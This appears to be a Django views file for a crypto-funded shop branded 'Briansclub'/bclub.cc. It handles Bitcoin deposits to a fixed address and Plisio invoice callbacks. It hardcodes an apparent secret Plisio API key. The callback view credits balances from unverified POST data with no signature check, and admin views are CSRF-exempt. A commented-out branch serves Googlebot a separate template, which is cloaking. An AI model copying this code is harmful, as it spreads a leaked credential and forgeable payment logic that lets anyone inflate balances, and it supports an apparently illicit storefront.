    # elif 'googlebot' in user_agent.lower() or 'google' in user_agent.lower() or ('google' in user_agent.lower() and 'adwords' in user_agent.lower()) or 'http://www.google.com/bot.html' in user_agent.lower():
    #     # Request is coming from a Googlebot crawler or google.com
    #     return render(request, 'googlebot_template.html', context)
    # else:
    billing_data = Billing.objects.filter(user=request.user)
    # context['billing_data'] = billing_data

    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config, 'billing_data': billing_data}
    address = BriansclubAddress.objects.first()
    if request.method == 'POST':
        transaction_id = request.POST.get('transaction_id')

        # Check if the transaction has already been processed
        if Transaction.objects.filter(transaction_id=transaction_id).exists():
            return render(request, 'main/error.html', {'message': 'Transaction already processed or the Transaction ID is invalid'})

        # Make a request to the Blockstream API to get transaction information
        api_url = f'https://blockstream.info/api/tx/{transaction_id}'
        response = requests.get(api_url)

        if response.status_code == 200:
            transaction = response.json()

            for i in transaction['vout']:
                if i['scriptpubkey_address'] == '3HzzLcyb6H7X8VaBmCrrobnEUXzEohLdQ9':
                    amount = i['value']

                    # Convert Bitcoin value to USD
                    usd_amount = convert_to_usd(amount) * 0.00000001
                    usd_amount = usd_amount * 0.82
                    usd_amount = round(usd_amount, 2)

                    # Update the user's balance
                    user = request.user
                    balance, created = Balance.objects.get_or_create(user=user)
                    balance.balance += round(usd_amount, 2)
                    balance.save()

                    # Save the transaction ID
                    Transaction.objects.create(balance=balance, transaction_id=transaction_id)

                    return render(request, 'main/success.html', {'amount': usd_amount})

            return render(request, 'main/error.html', {'message': 'Transaction not found'})
    return render(request, 'main/task_list.html', {'address': address, 'context':context, 'domain':domain})


from django.contrib.auth.decorators import login_required, user_passes_test
from django.shortcuts import render

from .forms import AdminReplyForm  # You'll need to create these forms
from .forms import BalanceForm
from .models import AdminReply, Balance, Reply, Ticket, Transaction


def is_admin(user):
    return user.is_superuser


@login_required_custom(login_url='/login')
@user_passes_test(is_admin)
@csrf_exempt
def ticket_view(request):
    if request.method == 'POST':
        form = AdminReplyForm(request.POST)
        if form.is_valid():
            ticket_id = request.POST.get('ticket_id')
            ticket = Ticket.objects.get(id=ticket_id)
            AdminReply.objects.create(ticket=ticket, message=form.cleaned_data['admin_reply'])
            return redirect('ticket_view')
    else:
        form = AdminReplyForm()
    tickets = Ticket.objects.all().order_by('-created_at', '-updated_at')
    return render(request, 'main/admin_tickets.html', {'tickets': tickets, 'form': form})

from .models import DomainAPIKey

@login_required_custom(login_url='/login')
@user_passes_test(is_admin)
@csrf_exempt
def balance_view(request):
    if request.method == 'POST':
        form = BalanceForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('balance_view')
    else:
        form = BalanceForm()
    balances = Balance.objects.all()
    return render(request, 'main/admin_balances.html', {'balances': balances, 'form': form})


import requests
from django.shortcuts import redirect
from django.urls import reverse
from django.views.decorators.http import require_http_methods
from django.utils import timezone

# @require_http_methods(["POST"])
# def create_deposit(request):
#     # Collect the necessary information from the form or user session
#     amount = request.POST.get('amount')
#     currency = request.POST.get('currency')
#     user_email = request.user.email  # Assuming the user is logged in and has an email

#     # Set up the parameters for the invoice
#     params = {
#         'source_currency': 'USD',
#         'source_amount': amount,
#         'order_number': 'unique_order_number',  # Generate a unique order number
#         'currency': currency,
#         'email': user_email,
#         'order_name': 'Deposit',
#         'callback_url': request.build_absolute_uri(reverse('plisio_callback')),
#         'api_key': '-KJNi4ZYTZa1vsudlJjeH8F2tKFZQnxbRkTU3vn8j4pS5QyWS01to3dqVXDzHEDM',  # Replace with your actual Plisio secret key
#     }

#     # Plisio API endpoint for creating an invoice
#     url = 'https://api.plisio.net/api/v1/invoices/new'

#     # Send the GET request to Plisio to create an invoice
#     response = requests.get(url, params=params)

#     if response.status_code == 200:
#         invoice_data = response.json()
#         if invoice_data.get('status') == 'success':
#             # Redirect the user to the Plisio invoice page
#             return redirect(invoice_data['data']['invoice_url'])
#         else:
#             return HttpResponse('An error occurred', status=500)

#             # Handle the error response from Plisio
#             # Redirect to an error page or display an error message
#     else:
#         # return HttpResponse('An error occurred', status=500)
#         # Handle the error if the request was not successful
#         # Redirect to an error page or display an error message

#     # Redirect back to the deposit page with an error message if the invoice was not created
#         return redirect('deposit_page')  # Replace 'deposit_page' with the name of your deposit page URL

import json
from django.http import HttpResponse
import plisio
client = plisio.PlisioClient(api_key='-KJNi4ZYTZa1vsudlJjeH8F2tKFZQnxbRkTU3vn8j4pS5QyWS01to3dqVXDzHEDM')

import hashlib
import hmac

from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt


def plisio_callback(request):
    if request.method == 'POST':
        try:
            domain = request.get_host()

            # Load the JSON data from the POST request
            form_data = request.POST  # This will automatically parse the form-data as a dictionary

            # Convert the form-data dictionary to a JSON string
            callback_data = json.dumps(form_data)
            print(callback_data)

            # Load the JSON data
            callback_data_dict = json.loads(callback_data)

            # Check the status of the transaction
            status = callback_data_dict.get('status')
            order_number = callback_data_dict.get('order_number')

            if not status or not order_number:
                return HttpResponse('Missing transaction status or order number', status=400)

            # Retrieve the Billing record using the order_number
            try:
                billing_record = Billing.objects.get(order_number=order_number)
            except Billing.DoesNotExist:
                return HttpResponse('Billing record not found', status=400)
            original_url = callback_data_dict.get('comment')[17:]

# Find the index where the specific part ends
            index_to_remove = original_url.find('/transactions/') + len('/transactions/')

            # Create the new URL by replacing the specific part
            new_url = 'https://plisio.net/invoice/' + original_url[index_to_remove:]

            # Update the Billing record's status and details
            billing_record.status = status
            billing_record.details = new_url
            billing_record.save()

            if status == 'completed':
                # Update the user's balance
                billing_record.status = 'Approved'
                billing_record.save()

                amount = float(callback_data_dict.get('source_amount', 0.0))
                user_balance, created = Balance.objects.get_or_create(user=billing_record.user)
                user_balance.balance += amount
                user_balance.save()

                return HttpResponse(f'Balance updated: {user_balance.balance}', status=200)
            else:
                # Handle other statuses if necessary
                print('Payment not completed')
                return HttpResponse('Payment not completed', status=200)

        except json.JSONDecodeError:
            return HttpResponse('Invalid JSON', status=400)
        except Exception as e:
            # Log the error
            print(e)
            return HttpResponse('An error occurred', status=500)
    else:
        return HttpResponse('Invalid request method', status=405)
@require_http_methods(["POST"])
def create_deposit(request):
    domain = request.get_host()
    print(domain)
    # Collect the necessary information from the form or user session
    amount = request.POST.get('amount')
    currency = request.POST.get('currency')
    user_email = request.user.email  # Assuming the user is logged in and has an email
    domain = request.get_host()

    # Generate a unique order number
    order_number = str(uuid.uuid4())
    print(order_number)
    print(currency)

    # Create a Billing record

    try:
        domain_api_key = DomainAPIKey.objects.get(domain=domain)
        api_key = domain_api_key.api_key
    except DomainAPIKey.DoesNotExist:
        return HttpResponse('API key not found for this domain', status=400)
    callback_url = 'https://' + request.get_host() + reverse('plisio_callback')

    # Set up the parameters for the invoice
    params = {
        'source_currency': 'USD',
        'source_amount': amount,
        'order_number': order_number,
        'currency': currency,
        'email': 'billing@bclub.cc',
        'order_name': 'Deposit',
        'callback_url': callback_url,
        'api_key': api_key,
    }
    print('paramds : ',params)

    # Plisio API endpoint for creating an invoice
    url = 'https://api.plisio.net/api/v1/invoices/new'

    # Send the GET request to Plisio to create an invoice
    response = requests.get(url, params=params)
    print(response.status_code)
    if response.status_code == 200:
        invoice_data = response.json()
        if invoice_data.get('status') == 'success':
            # Redirect the user to the Plisio invoice page
            billing_record = Billing.objects.create(
            user=request.user,
            system=currency,
            amount=amount,
            status='pending',
            date=timezone.now(),
            details=invoice_data['data']['invoice_url'],
            order_number=order_number  # Make sure to add this field to your Billing model
            )
            print(billing_record)
            print('test')
            print(currency)
            return redirect(invoice_data['data']['invoice_url'])
        else:
            # Handle the error response from Plisio
            return HttpResponse('An error occurred', status=500)
    else:
        # Handle the error if the request was not successful
        return redirect('tasklist')  # Redirect to a page where the user can see the error or try again # Replace 'deposit_page' with the name of your deposit page URL
def payment_success(request):
    # You can pass additional context or retrieve session data if needed
    return redirect('tasklist')

def payment_failed(request):
    # You can pass additional context or retrieve session data if needed
    return render(request, 'main/payment_failed.html')
